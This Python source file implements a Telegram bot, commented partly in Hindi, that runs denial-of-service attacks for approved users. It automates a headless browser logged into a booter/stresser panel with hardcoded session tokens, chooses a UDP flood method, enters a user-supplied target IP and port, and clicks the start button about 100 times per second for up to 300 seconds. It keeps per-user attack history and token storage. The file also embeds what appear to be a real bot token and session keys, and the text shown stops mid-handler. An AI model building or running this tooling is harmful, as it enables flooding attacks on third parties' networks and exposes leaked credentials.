# ============================================================
#  ⚡ TELEGRAM ATTACK BOT — Full Featured
#  - Preloaded workers (jaise api.py)
#  - User approval system
#  - Broadcast, help, admin commands
#  - Inline UI with buttons
# ============================================================
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from cloakbrowser import launch
import time
import threading
import json
import os
import secrets
import queue
from datetime import datetime

# ============================================================
#  ⚙️ CONFIG
# ============================================================
METHOD         = "UDP-BIG"
BOT_TOKEN      = "8987069237:AAGH_ExqtgnBsiKpNrMoPwKslocK7Dx9cjs"
OWNER_ID       = 7883336006
MAX_PRELOADED  = 2
API_NAME       = "⚡ STTRSERRR ATTACK BOT"
MAX_DURATION   = 300
MIN_DURATION   = 1

# ⚡ SPEED
SPAM_SLEEP     = 0.01
FILL_DELAY     = 0.02
METHOD_DELAY   = 0.3
POOL_CHECK     = 1
SPAWN_GAP      = 0.01

# 🌐 PRELOAD TOKENS (owner ke)
SESSIONS_DATA = [
    {"session_number": 1,  "access_key": "32de18ee49ba49ada55f3ca2e1fe8d1fd5601d5d1c8b48f2be24395e61c56482"},
    {"session_number": 2,  "access_key": "0021c1d3e3b0434e97cf81017dd2729b6a02ab98e8b1471f9a704c2b866b5148"},
]

# 📁 FILES
USERS_FILE       = "users.json"           # approved users
USER_TOKENS_FILE = "user_tokens.json"     # user ke apne tokens
HISTORY_FILE     = "history.json"         # attack history
SS_FOLDER        = "screenshots"
os.makedirs(SS_FOLDER, exist_ok=True)

# ============================================================
#  🌍 GLOBALS
# ============================================================
sessions             = []
sessions_lock        = threading.Lock()

active_attacks       = 0
active_attacks_lock  = threading.Lock()

attack_queue         = queue.Queue()

worker_pool          = []
worker_pool_lock     = threading.Lock()
workers_loading      = 0
workers_loading_lock = threading.Lock()

attack_counter       = 0
attack_counter_lock  = threading.Lock()

session_index        = 0
session_index_lock   = threading.Lock()

worker_counter       = 0
worker_counter_lock  = threading.Lock()

# 📦 DATA (loaded from files)
approved_users  = {}    # {user_id: {"username", "approved_at", "role"}}
user_tokens     = {}    # {user_id: [{"id", "token", "label"}]}
attack_history  = []    # list of dicts
users_lock      = threading.Lock()
tokens_lock     = threading.Lock()
history_lock    = threading.Lock()

# ============================================================
#  💾 LOAD / SAVE
# ============================================================
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path) as f:
                return json.load(f)
        except Exception:
            return default
    return default


def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"⚠️ Save failed {path}: {e}")


def load_all():
    global approved_users, user_tokens, attack_history
    approved_users = load_json(USERS_FILE, {})
    user_tokens    = load_json(USER_TOKENS_FILE, {})
    attack_history = load_json(HISTORY_FILE, [])

    # Auto-approve owner
    owner_str = str(OWNER_ID)
    if owner_str not in approved_users:
        approved_users[owner_str] = {
            "username": "Owner",
            "approved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "role": "owner"
        }
        save_json(USERS_FILE, approved_users)


def save_users():
    with users_lock:
        save_json(USERS_FILE, approved_users)


def save_tokens():
    with tokens_lock:
        save_json(USER_TOKENS_FILE, user_tokens)


def save_history():
    with history_lock:
        save_json(HISTORY_FILE, attack_history[-200:])


def add_history(entry):
    with history_lock:
        attack_history.append(entry)
    save_history()


# ============================================================
#  👤 USER HELPERS
# ============================================================
def is_owner(uid):
    return int(uid) == OWNER_ID


def is_approved(uid):
    return str(uid) in approved_users


def get_role(uid):
    return approved_users.get(str(uid), {}).get("role", "user")


def approve_user(uid, username, role="user"):
    with users_lock:
        approved_users[str(uid)] = {
            "username": username or f"User{uid}",
            "approved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "role": role
        }
    save_users()


def revoke_user(uid):
    with users_lock:
        approved_users.pop(str(uid), None)
    save_users()


# ============================================================
#  🔑 SESSIONS
# ============================================================
def load_sessions():
    global sessions
    sessions = []
    for entry in SESSIONS_DATA:
        token = entry["access_key"]
        if "YAHAN" in token or len(token) < 32:
            continue
        cookies = [{
            "name": "auth_token", "value": token,
            "domain": "retrostress.net", "path": "/",
            "expires": 1794408155.470651,
            "httpOnly": True, "secure": True, "sameSite": "Lax"
        }]
        sessions.append({"id": entry["session_number"], "cookies": cookies})
    return len(sessions) > 0


def get_next_session():
    global session_index
    with session_index_lock:
        if not sessions:
            return None
        s = sessions[session_index % len(sessions)]
        session_index += 1
        return s


# ============================================================
#  🎯 ATTACK LOGIC
# ============================================================
def select_udp_big(page, name="W"):
    for retry in range(3):
        try:
            page.evaluate("""() => {
                const b = document.querySelectorAll('button');
                for (const x of b) {
                    const t = x.innerText || x.textContent || '';
                    if (t.includes('Network endpoint') || t.includes('Layer 4')) {
                        x.click(); return;
                    }
                }
            }""")
            time.sleep(METHOD_DELAY)

            page.evaluate("""() => {
                const s = document.querySelector('span.app-method-trigger-action');
                if (s) { s.click(); return; }
                const all = document.querySelectorAll('span');
                for (const x of all) {
                    if (x.innerText && x.innerText.includes('Browse methods')) {
                        x.click(); return;
                    }
                }
            }""")
            time.sleep(METHOD_DELAY)

            page.evaluate("""() => {
                const b = document.querySelectorAll('button');
                for (const x of b) {
                    if ((x.innerText || '').trim() === 'UDP') { x.click(); return; }
                }
            }""")
            time.sleep(METHOD_DELAY)

            ok = page.evaluate(f"""() => {{
                const opts = document.querySelectorAll('button[role="option"]');
                for (const o of opts) {{
                    const s = o.querySelector('strong');
                    if (s && s.textContent.trim() === '{METHOD}') {{
                        o.click(); return true;
                    }}
                }}
                const btns = document.querySelectorAll('button');
                for (const b of btns) {{
                    const s = b.querySelector('strong');
                    if (s && s.textContent.trim() === '{METHOD}') {{
                        b.click(); return true;
                    }}
                }}
                return false;
            }}""")
            if ok:
                return True
        except Exception as e:
            print(f"[{name}] retry {retry+1}: {e}")
            time.sleep(1)
    return False


def do_spam(page, ip, port, duration, name="W"):
    page.evaluate("""(d) => {
        const ipEl = document.querySelector('input#test-url');
        if (ipEl) {
            ipEl.focus(); ipEl.value = d.ip;
            ipEl.dispatchEvent(new Event('input', { bubbles: true }));
            ipEl.dispatchEvent(new Event('change', { bubbles: true }));
        }
        const pEl = document.querySelector('input[aria-label="port"]');
        if (pEl) {
            pEl.focus(); pEl.value = d.port;
            pEl.dispatchEvent(new Event('input', { bubbles: true }));
            pEl.dispatchEvent(new Event('change', { bubbles: true }));
        }
    }""", {"ip": ip, "port": str(port)})
    time.sleep(FILL_DELAY)

    try:
        btn = page.locator('button.button.primary:has-text("Start test")')
    except Exception:
        return 0

    spam_dur = max(duration - 1, 1)
    start = time.time()
    clicks = 0

    print(f"[{name}] 🚀 SPAM {spam_dur}s → {ip}:{port}")

    while time.time() - start < spam_dur:
        try:
            btn.click(force=True, timeout=1500)
            clicks += 1
            if clicks % 500 == 0:
                cps = int(clicks / max(time.time() - start, 1))
                print(f"[{name}] ⚡ {clicks} | {cps} CPS")
            time.sleep(SPAM_SLEEP)
        except Exception:
            time.sleep(SPAM_SLEEP)

    print(f"[{name}] ✅ DONE | {clicks} clicks")
    return clicks


# ============================================================
#  🔧 PRELOAD WORKER
# ============================================================
def preload_worker(worker_number):
    global active_attacks, workers_loading, attack_counter

    browser = None
    loading_dec = False
    got_job = False

    session = get_next_session()
    if not session:
        with workers_loading_lock:
            if workers_loading > 0:
                workers_loading -= 1
        return

    try:
        print(f"[W{worker_number}] 🌐 Session {session['id']} opening...")
        browser = launch(headless=True)
        page = browser.new_page()
        page.set_viewport_size({"width": 1280, "height": 720})
        page.context.add_cookies(session["cookies"])
        page.goto("https://retrostress.net/panel",
                  wait_until="domcontentloaded", timeout=60000)
        time.sleep(1.5)

        if "auth" in page.url or "login" in page.url:
            print(f"[W{worker_number}] ❌ Session expired")
            return

        if not select_udp_big(page, f"W{worker_number}"):
            print(f"[W{worker_number}] ❌ Method select failed")
            return

        print(f"[W{worker_number}] ✅ Ready")

        with workers_loading_lock:
            if workers_loading > 0:
                workers_loading -= 1
            loading_dec = True

        with worker_pool_lock:
            if len(worker_pool) >= MAX_PRELOADED:
                return
            worker_pool.append(worker_number)

        job = attack_queue.get(block=True)
        got_job = True

        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)

        with attack_counter_lock:
            attack_counter += 1

        clicks = do_spam(page, job["ip"], job["port"], job["duration"],
                         f"W{worker_number}")

        # Update history
        add_history({
            "user_id": job.get("user_id"),
            "username": job.get("username"),
            "target": f"{job['ip']}:{job['port']}",
            "duration": job["duration"],
            "clicks": clicks,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "success"
        })

    except Exception as e:
        print(f"[W{worker_number}] ❌ {e}")
    finally:
        if browser:
            try:
                browser.close()
            except Exception:
                pass
        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)
        if not loading_dec:
            with workers_loading_lock:
                if workers_loading > 0:
                    workers_loading -= 1
        if got_job:
            with active_attacks_lock:
                if active_attacks > 0:
                    active_attacks -= 1


# ============================================================
#  🔄 POOL MANAGER
# ============================================================
def pool_manager():
    global workers_loading, worker_counter
    while True:
        try:
            with worker_pool_lock:
                pool = len(worker_pool)
            with workers_loading_lock:
                loading = workers_loading

            needed = MAX_PRELOADED - (pool + loading)
            if needed > 0:
                for _ in range(needed):
                    with workers_loading_lock:
                        workers_loading += 1
                    with worker_counter_lock:
                        worker_counter += 1
                        wn = worker_counter
                    threading.Thread(
                        target=preload_worker, args=(wn,), daemon=True
                    ).start()
                    time.sleep(SPAWN_GAP)
        except Exception as e:
            print(f"[Pool] {e}")
        time.sleep(POOL_CHECK)


# ============================================================
#  🎯 QUEUE ATTACK
# ============================================================
def queue_attack(user_id, username, ip, port, duration):
    global active_attacks

    with worker_pool_lock:
        pool = len(worker_pool)

    if pool == 0:
        return {"status": "error", "message": "No workers ready, try in 20s"}

    if not (MIN_DURATION <= duration <= MAX_DURATION):
        return {"status": "error", "message": f"Duration {MIN_DURATION}-{MAX_DURATION}s"}

    with active_attacks_lock:
        active_attacks += 1
        aid = active_attacks

    attack_queue.put({
        "ip": ip,
        "port": port,
        "duration": duration,
        "attack_id": aid,
        "user_id": user_id,
        "username": username
    })

    return {
        "status": "success",
        "attack_id": aid,
        "target": f"{ip}:{port}",
        "duration": duration,
        "pool_ready": pool
    }


# ============================================================
#  🎨 UI BUILDERS
# ============================================================
def main_menu_kb(uid):
    rows = [
        [InlineKeyboardButton("🎯 Attack", callback_data="m_attack"),
         InlineKeyboardButton("📊 Status", callback_data="m_status")],
        [InlineKeyboardButton("🔑 My Tokens", callback_data="m_tokens"),
         InlineKeyboardButton("📜 History", callback_data="m_history")],
        [InlineKeyboardButton("❓ Help", callback_data="m_help")]
    ]
    if is_owner(uid):
        rows.append([
            InlineKeyboardButton("👑 Admin Panel", callback_data="m_admin")
        ])
    return InlineKeyboardMarkup(rows)


def attack_menu_kb(uid):
    rows = [
        [InlineKeyboardButton("⚡ Quick Attack", callback_data="a_quick")],
        [InlineKeyboardButton("🎯 Custom Target", callback_data="a_custom")],
        [InlineKeyboardButton("🔙 Back", callback_data="m_home")]
    ]
    return InlineKeyboardMarkup(rows)


def tokens_menu_kb(uid):
    rows = [
        [InlineKeyboardButton("➕ Add Token", callback_data="t_add"),
         InlineKeyboardButton("📋 List", callback_data="t_list")],
        [InlineKeyboardButton("🗑️ Remove", callback_data="t_remove")],
        [InlineKeyboardButton("🔙 Back", callback_data="m_home")]
    ]
    return InlineKeyboardMarkup(rows)


def back_kb(target="m_home"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back", callback_data=target)]
    ])


def admin_menu_kb():
    rows = [
        [InlineKeyboardButton("👥 Users", callback_data="ad_users")],
        [InlineKeyboardButton("➕ Approve User", callback_data="ad_approve"),
         InlineKeyboardButton("➖ Revoke User", callback_data="ad_revoke")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="ad_broadcast")],
        [InlineKeyboardButton("📊 Full Stats", callback_data="ad_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="m_home")]
    ]
    return InlineKeyboardMarkup(rows)


def cancel_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="m_home")]
    ])


def check_access_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 Request Access", callback_data="req_access")]
    ])


# ============================================================
#  📝 TEXT TEMPLATES
# ============================================================
def welcome_text(uid):
    name = approved_users.get(str(uid), {}).get("username", "User")
    role = get_role(uid)
    badge = "👑 Owner" if role == "owner" else "✅ Approved"
    with worker_pool_lock:
        pool = len(worker_pool)
    with tokens_lock:
        n_tokens = len(user_tokens.get(str(uid), []))
    return (
        f"⚡ *{API_NAME}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 *{name}*  {badge}\n"
        f"🆔 `{uid}`\n\n"
        f"⚙️ *Workers Ready:* `{pool}/{MAX_PRELOADED}`\n"
        f"🔑 *My Tokens:* `{n_tokens}`\n"
        f"⚡ *Speed:* `{int(1/SPAM_SLEEP)} CPS`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"_Choose an option:_"
    )


def status_text(uid):
    with worker_pool_lock:
        pool = len(worker_pool)
    with workers_loading_lock:
        loading = workers_loading
    with active_attacks_lock:
        active = active_attacks
    with users_lock:
        n_users = len(approved_users)
    with tokens_lock:
        my_tokens = len(user_tokens.get(str(uid), []))

    return (
        f"📊 *STATUS*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🟢 *System:* Online\n"
        f"⚙️ *Pool Ready:* `{pool}/{MAX_PRELOADED}`\n"
        f"⏳ *Loading:* `{loading}`\n"
        f"🎯 *Active:* `{active}`\n\n"
        f"🌐 *Sessions:* `{len(sessions)}`\n"
        f"👥 *Users:* `{n_users}`\n"
        f"🔑 *My Tokens:* `{my_tokens}`\n\n"
        f"⚡ *CPS/Worker:* `{int(1/SPAM_SLEEP)}`\n"
        f"🔥 *Max PPS:* `{pool * int(1/SPAM_SLEEP)}`"
    )


def help_text():
    return (
        f"❓ *HELP*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*🎯 ATTACK:*\n"
        f"Button se attack karo. Target IP, Port, Duration do.\n\n"
        f"*🔑 TOKENS:*\n"
        f"Apne retrostress tokens add karo (max 6).\n"
        f"Format: `Label | Token`\n\n"
        f"*⏱️ LIMITS:*\n"
        f"• Duration: `{MIN_DURATION}-{MAX_DURATION}` sec\n"
        f"• Port: `1-65535`\n"
        f"• Concurrent: `{MAX_PRELOADED}`\n\n"
        f"*📌 COMMANDS:*\n"
        f"/start — Main menu\n"
        f"/help — This help\n"
        f"/status — Live status\n"
        f"/attack — Attack menu\n"
        f"/tokens — Token manager\n"
        f"/history — My attacks\n"
        f"/broadcast — (Owner)\n"
        f"/approve — (Owner)\n"
        f"/revoke — (Owner)\n"
        f"/users — (Owner)"
    )


# ============================================================
#  🚀 COMMAND HANDLERS
# ============================================================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text(
            f"🔒 *ACCESS DENIED*\n\n"
            f"Tumhe approve karna padega.\n"
            f"Owner ko request bhejo.\n\n"
            f"🆔 Your ID: `{uid}`",
            parse_mode="Markdown",
            reply_markup=check_access_kb()
        )
        return

    await update.message.reply_text(
        welcome_text(uid),
        parse_mode="Markdown",
        reply_markup=main_menu_kb(uid)
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    await update.message.reply_text(
        help_text(),
        parse_mode="Markdown",
        reply_markup=back_kb()
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    await update.message.reply_text(
        status_text(uid),
        parse_mode="Markdown",
        reply_markup=back_kb()
    )


async def cmd_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    await update.message.reply_text(
        f"🎯 *ATTACK MENU*\n\n"
        f"Target do aur attack fire karo.\n"
        f"Duration: `{MIN_DURATION}-{MAX_DURATION}s`",
        parse_mode="Markdown",
        reply_markup=attack_menu_kb(uid)
    )


async def cmd_tokens(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    with tokens_lock:
        n = len(user_tokens.get(str(uid), []))
    await update.message.reply_text(
        f"🔑 *TOKEN MANAGER*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Saved: `{n}`\n\n"
        f"Tokens add karo attack ke liye.",
        parse_mode="Markdown",
        reply_markup=tokens_menu_kb(uid)
    )


async def cmd_history(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    with history_lock:
        my_hist = [h for h in attack_history if str(h.get("user_id")) == str(uid)][-10:]

    if not my_hist:
        await update.message.reply_text(
            "📭 *No attacks yet*",
            parse_mode="Markdown",
            reply_markup=back_kb()
        )
        return

    text = "📜 *RECENT ATTACKS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for h in reversed(my_hist):
        icon = "✅" if h.get("status") == "success" else "❌"
        text += f"{icon} `{h.get('target')}` | `{h.get('duration')}s`\n"
        text += f"   ⚡ {h.get('clicks', 0)} clicks | _{h.get('time')}_\n\n"

    await update.message.reply_text(text, parse_mode="Markdown",
                                     reply_markup=back_kb())


# ============================================================
#  👑 OWNER COMMANDS
# ============================================================
async def cmd_approve(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return

    args = ctx.args
    if not args:
        await update.message.reply_text(
            "❌ Usage: `/approve <user_id> [name]`",
            parse_mode="Markdown")
        return

    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")
        return

    name = args[1] if len(args) > 1 else f"User{target_id}"
    approve_user(target_id, name)

    await update.message.reply_text(
        f"✅ *Approved!*\n\n"
        f"🆔 `{target_id}`\n"
        f"👤 {name}",
        parse_mode="Markdown")

    # Notify user
    try:
        await ctx.bot.send_message(
            target_id,
            f"✅ *You have been approved!*\n\n"
            f"Send /start to begin.",
            parse_mode="Markdown")
    except Exception:
        pass


async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return

    if not ctx.args:
        await update.message.reply_text("❌ Usage: `/revoke <user_id>`",
                                         parse_mode="Markdown")
        return

    try:
        target_id = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")
        return

    if target_id == OWNER_ID:
        await update.message.reply_text("❌ Cannot revoke owner")
        return

    revoke_user(target_id)
    await update.message.reply_text(f"✅ Revoked `{target_id}`",
                                     parse_mode="Markdown")


async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return

    with users_lock:
        users = dict(approved_users)

    if not users:
        await update.message.reply_text("📭 No users")
        return

    text = f"👥 *USERS ({len(users)})*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, (u_id, u_data) in enumerate(users.items(), 1):
        role = u_data.get("role", "user")
        badge = "👑" if role == "owner" else "✅"
        text += f"{i}. {badge} *{u_data.get('username', 'Unknown')}*\n"
        text += f"    🆔 `{u_id}`\n"
        text += f"    📅 _{u_data.get('approved_at', '')}_\n\n"

    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return

    if not ctx.args:
        ctx.user_data["expecting"] = "broadcast"
        await update.message.reply_text(
            "📢 *BROADCAST*\n\n"
            "Send the message you want to broadcast:",
            parse_mode="Markdown",
            reply_markup=cancel_kb())
        return

    msg = " ".join(ctx.args)
    await do_broadcast(update, ctx, msg)


async def do_broadcast(update, ctx, msg):
    with users_lock:
        users = list(approved_users.keys())

    ok = 0
    fail = 0
    for u_id in users:
        if str(u_id) == str(OWNER_ID):
            continue
        try:
            await ctx.bot.send_message(
                int(u_id),
                f"📢 *BROADCAST*\n\n{msg}",
                parse_mode="Markdown")
            ok += 1
        except Exception:
            fail += 1

    await update.effective_message.reply_text(
        f"✅ *Broadcast sent!*\n\n"
        f"✅ Success: `{ok}`\n"
        f"❌ Failed: `{fail}`",
        parse_mode="Markdown")


# ============================================================
#  🔄 CALLBACK HANDLER
# ============================================================
async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    # Not approved → only request access
    if not is_approved(uid):
        if data == "req_access":
            try:
                await ctx.bot.send_message(
                    OWNER_ID,
                    f"📩 *ACCESS REQUEST*\n\n"
                    f"👤 {q.from_user.full_name}\n"
                    f"🆔 `{uid}`\n"
                    f"🔗 @{q.from_user.username or 'no-username'}\n\n"
                    f"Approve: `/approve {uid} {q.from_user.first_name}`",
                    parse_mode="Markdown")
                await q.edit_message_text("✅ Request sent to owner!")
            except Exception:
                await q.edit_message_text("❌ Failed to send request")
        return

    # ===== HOME =====
    if data == "m_home":
        await q.edit_message_text(
            welcome_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_kb(uid))

    # ===== STATUS =====
    elif data == "m_status":
        await q.edit_message_text(
            status_text(uid),
            parse_mode="Markdown",
            reply_markup=back_kb())

    # ===== HELP =====
    elif data == "m_help":
        await q.edit_message_text(
            help_text(),
            parse_mode="Markdown",
            reply_markup=back_kb())

    # ===== TOKENS =====
    elif data == "m_tokens":
        with tokens_lock:
            n = len(user_tokens.get(str(uid), []))
        await q.edit_message_text(
            f"🔑 *TOKEN MANAGER*\n\nSaved: `{n}`",
            parse_mode="Markdown",
            reply_markup=tokens_menu_kb(uid))

    elif data == "t_add":
        ctx.user_data["expecting"] = "add_token"
        await q.edit_message_text(
            "📝 *ADD TOKEN*\n\n"
            "Format:\n"
            "`Label | Token`\n\n"
            "*Example:*\n"
            "`Manu | 32de18ee49ba49ada5...`\n\n"
            "Or just the token.",
            parse_mode="Markdown",
            reply_markup=cancel_kb())

    elif data == "t_list":
        with tokens_lock:
            toks = list(user_tokens.get(str(uid), []))
        if not toks:
            await q.edit_message_text(
                "📭 *No tokens*",
                parse_mode="Markdown",
                reply_markup=tokens_menu_kb(uid))
            return
        text = f"🔑 *MY TOKENS ({len(toks)})*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, t in enumerate(toks, 1):
            short = t["token"][:10] + "…" + t["token"][-4:]
            text += f"{i}. *{t.get('label', f'Token {i}')}*\n`{short}`\n\n"
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=tokens_menu_kb(uid))

    elif data == "t_remove":
        with tokens_lock:
            toks = list(user_tokens.get(str(uid), []))
        if not toks:
            await q.edit_message_text(
                "📭 *No tokens*",
                parse_mode="Markdown",
                reply_markup=tokens_menu_kb(uid))
            return
        rows = []
        for t in toks:
            rows.append([InlineKeyboardButton(
                f"🗑️ {t.get('label', 'Token')}",
                callback_data=f"t_del_{t['id']}")])
        rows.append([InlineKeyboardButton("🔙 Back", callback_data="m_tokens")])
        await q.edit_message_text(
            "🗑️ *Remove Token*\nPick one:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(rows))

    elif data.startswith("t_del_"):
        tid = data.replace("t_del_", "")
        with tokens_lock:
            toks = user_tokens.get(str(uid), [])
            new_toks = [t for t in toks if t["id"] != tid]
            user_tokens[str(uid)] = new_toks
            n = len(new_toks)
        save_tokens()
        await q.edit_message_text(
            f"✅ *Removed*\n\nRemaining: `{n}`",
            parse_mode="Markdown",
            reply_markup=tokens_menu_kb(uid))

    # ===== ATTACK =====
    elif data == "m_attack":
        with tokens_lock:
            n_tok = len(user_tokens.get(str(uid), []))
        await q.edit_message_text(
            f"🎯 *ATTACK MENU*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔑 Your tokens: `{n_tok}`\n"
            f"⚙️ Workers: `{len(worker_pool)}/{MAX_PRELOADED}`\n\n"
            f"_Choose mode:_",
            parse_mode="Markdown",
            reply_markup=attack_menu_kb(uid))

    elif data == "a_quick":
        # Quick: use preloaded workers with just IP
        ctx.user_data["attack_mode"] = "quick"
        ctx.user_data["expecting"] = "attack_ip"
        await q.edit_message_text(
            "⚡ *QUICK ATTACK*\n\n"
            "🎯 Send target *IP*:",
            parse_mode="Markdown",
            reply_markup=cancel_kb())

    elif data == "a_custom":
        ctx.user_data["attack_mode"] = "custom"
        ctx.user_data["expecting"] = "attack_ip"
        await q.edit_message_text(
            "🎯 *CUSTOM ATTACK*\n\n"
            "🎯 Send target *IP*:",
            parse_mode="Markdown",
            reply_markup=cancel_kb())

    # ===== HISTORY =====
    elif data == "m_history":
        with history_lock:
            my_hist = [h for h in attack_history if str(h.get("user_id")) == str(uid)][-10:]

        if not my_hist:
            await q.edit_message_text(
                "📭 *No attacks yet*",
                parse_mode="Markdown",
                reply_markup=back_kb())
            return

        text = "📜 *RECENT ATTACKS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for h in reversed(my_hist):
            icon = "✅" if h.get("status") == "success" else "❌"
            text += f"{icon} `{h.get('target')}` | `{h.get('duration')}s`\n"
            text += f"   ⚡ {h.get('clicks', 0)} clicks\n\n"
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=back_kb())

    # ===== ADMIN =====
    elif data == "m_admin" and is_owner(uid):
        await q.edit_message_text(
            f"👑 *ADMIN PANEL*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Manage users, broadcast, stats.",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb())

    elif data == "ad_users" and is_owner(uid):
        with users_lock:
            users = dict(approved_users)
        text = f"👥 *USERS ({len(users)})*\n\n"
        for u_id, u_data in users.items():
            role = u_data.get("role", "user")
            badge = "👑" if role == "owner" else "✅"
            text += f"{badge} *{u_data.get('username', 'Unknown')}* — `{u_id}`\n"
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=back_kb("m_admin"))

    elif data == "ad_approve" and is_owner(uid):
        ctx.user_data["expecting"] = "approve_user"
        await q.edit_message_text(
            "➕ *APPROVE USER*\n\n"
            "Send: `<user_id> <name>`\n\n"
            "Example: `123456789 Rahul`",
            parse_mode="Markdown",
            reply_markup=back_kb("m_admin"))

    elif data == "ad_revoke" and is_owner(uid):
        ctx.user_data["expecting"] = "revoke_user"
        await q.edit_message_text(
            "➖ *REVOKE USER*\n\n"
            "Send `<user_id>`",
            parse_mode="Markdown",
            reply_markup=back_kb("m_admin"))

    elif data == "ad_broadcast" and is_owner(uid):
        ctx.user_data["expecting"] = "broadcast"
        await q.edit_message_text(
            "📢 *BROADCAST*\n\n"
            "Send the message:",
            parse_mode="Markdown",
            reply_markup=back_kb("m_admin"))

    elif data == "ad_stats" and is_owner(uid):
        with users_lock:
            n_users = len(approved_users)
        with history_lock:
            n_hist = len(attack_history)
        with tokens_lock:
            total_toks = sum(len(v) for v in user_tokens.values())
        with worker_pool_lock:
            pool = len(worker_pool)
        with active_attacks_lock:
            active = active_attacks

        text = (
            f"📊 *FULL STATS*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 Users: `{n_users}`\n"
            f"📜 History: `{n_hist}`\n"
            f"🔑 Total Tokens: `{total_toks}`\n"
            f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
            f"🎯 Active: `{active}`\n"
            f"🌐 Sessions: `{len(sessions)}`"
        )
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=back_kb("m_admin"))


# ============================================================
#  📩 TEXT MESSAGE HANDLER
# ============================================================
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if not is_approved(uid):
        return

    expecting = ctx.user_data.get("expecting")
    text = (update.message.text or "").strip()

    if not expecting or not text:
        return

    # ===== ADD TOKEN =====
    if expecting == "add_token":
        if "|" in text:
            label, token = [x.strip() for x in text.split("|", 1)]
        else:
            with tokens_lock:
                label = f"Token {len(user_tokens.get(str(uid), [])) + 1}"
            token = text

        if len(token) < 32:
            await update.message.reply_text("❌ Token too short. Try again.")
            return

        tid = secrets.token_hex(4)
        with tokens_lock:
            toks = user_tokens.setdefault(str(uid), [])
            if len(toks) >= 6:
                await update.message.reply_text("❌ Max 6 tokens allowed")
                return
            toks.append({"id": tid, "token": token, "label": label})
            n = len(toks)
        save_tokens()
        ctx.user_data.pop("expecting", None)

        await update.message.reply_text(
            f"✅ *Token Added*\n\n"
            f"Label: `{label}`\n"
            f"Token: `{token[:10]}…{token[-4:]}`\n\n"
            f"Total: `{n}`",
            parse_mode="Markdown",
            reply_markup=tokens_menu_kb(uid))

    # ===== ATTACK: IP → PORT → DURATION =====
    elif expecting == "attack_ip":
        ctx.user_data["attack_ip"] = text
        ctx.user_data["expecting"] = "attack_port"
        await update.message.reply_text(
            f"🔌 IP: `{text}`\n\nNow send *PORT*:",
            parse_mode="Markdown",
            reply_markup=cancel_kb())

    elif expecting == "attack_port":
        try:
            p = int(text)
            if not (1 <= p <= 65535):
                raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Invalid port (1-65535)")
            return
        ctx.user_data["attack_port"] = p
        ctx.user_data["expecting"] = "attack_dur"
        await update.message.reply_text(
            f"🔌 Port: `{p}`\n\nNow send *DURATION* ({MIN_DURATION}-{MAX_DURATION}s):",
            parse_mode="Markdown",
            reply_markup=cancel_kb())

